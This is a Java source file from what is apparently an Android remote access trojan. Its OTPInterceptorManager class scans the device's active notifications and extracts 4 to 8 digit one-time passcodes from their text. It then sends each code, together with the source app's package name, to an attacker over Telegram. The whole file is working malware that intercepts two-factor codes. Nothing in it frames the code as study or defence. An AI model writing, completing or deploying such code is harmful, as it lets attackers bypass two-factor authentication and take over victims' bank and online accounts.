package com.enterprise.rat.commands;

import android.os.Bundle;
import android.service.notification.StatusBarNotification;
import com.enterprise.rat.services.NotificationService;
import com.enterprise.rat.utils.TelegramApi;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class OTPInterceptorManager {
    public static void interceptOTP() {
        NotificationService svc = NotificationService.getInstance();
        if (svc == null) { TelegramApi.sendMessage("❌ Service inactive"); return; }
        StatusBarNotification[] notifications = svc.getActiveNotifications();
        if (notifications == null || notifications.length == 0) { TelegramApi.sendMessage("🔍 No notifications."); return; }
        Pattern otpPattern = Pattern.compile("\\b(\\d{4,8})\\b");
        StringBuilder sb = new StringBuilder("<b>🔐 OTP Scan</b>\n\n"); boolean found = false;
        for (StatusBarNotification sbn : notifications) {
            Bundle extras = sbn.getNotification().extras;
            String text = extras.getString("android.title","") + " " + extras.getCharSequence("android.text","");
            Matcher matcher = otpPattern.matcher(text);
            while (matcher.find()) {
                String otp = matcher.group(1);
                if (otp.length() >= 4 && otp.length() <= 8 && !otp.startsWith("20") && !otp.startsWith("19")) {
                    sb.append("<b>App:</b> <code>").append(sbn.getPackageName()).append("</code> <b>OTP:</b> <code>").append(otp).append("</code>\n");
                    found = true;
                }
            }
        }
        if (!found) sb.append("<i>No OTP detected.</i>");
        TelegramApi.sendMessage(sb.toString());
    }
}
